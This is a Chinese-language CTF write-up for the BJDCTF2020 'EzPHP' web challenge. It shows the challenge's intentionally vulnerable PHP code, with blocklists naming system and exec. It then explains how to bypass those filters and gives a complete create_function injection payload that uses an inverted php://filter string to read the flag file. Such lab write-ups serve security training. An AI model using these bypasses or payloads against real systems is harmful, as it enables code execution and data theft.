---
title: "BUUCTF Web Writeup 7"
date: 2022-11-03T10:28:03+08:00
lastmod: 2022-11-03T10:28:03+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

<!--more-->

## [BJDCTF2020]EzPHP

右键注释 base32

```php
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```

`$_SERVER['QUERY_STRING']` 的特性是不会 urldeode, 而 `$_GET` 会进行 urlencode, 因此可以双重编码绕过

`$_REQUEST` 优先解析 `$_POST` 内容, 其实还是看配置文件, 默认情况下先解析了 `$_GET`, 只不过是后来解析的 `$_POST` 把前面的给覆盖掉了

`preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute')` 这句可以在末尾加上 `%0a` 绕过, 因为单行模式下 `$` 不匹配换行符

`file_get_contents` 和 sha1 的绕过就不说了, 很简单

`preg_match('/^[a-z0-9]*$/isD', $code)` 用根命名空间绕过, 例如 `\create_function`

最后的正则里面没有 require (system 也没有, 但好像是被禁用了), 于是通过 require + 伪协议配合取反字符串绕过

`$code('', $arg);` 就是 `create_function` 的形式, 可以闭合大括号来执行任意代码

payload 如下

```php
get: debu=aqua_is_cute
&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2&flag[code]=\create_function&flag[arg]=return 0;}require(~%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f);//

post: debu=123&file=123
```

其中 get 要把字母部分 urlencode, 即

```php
%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%63%6f%64%65]=%5c%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67[%61%72%67]=%72%65%74%75%72%6e+0;}%72%65%71%75%69%72%65(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%99%93%9E%98%D1%8F%97%8F);//
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031153793.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031153820.png)

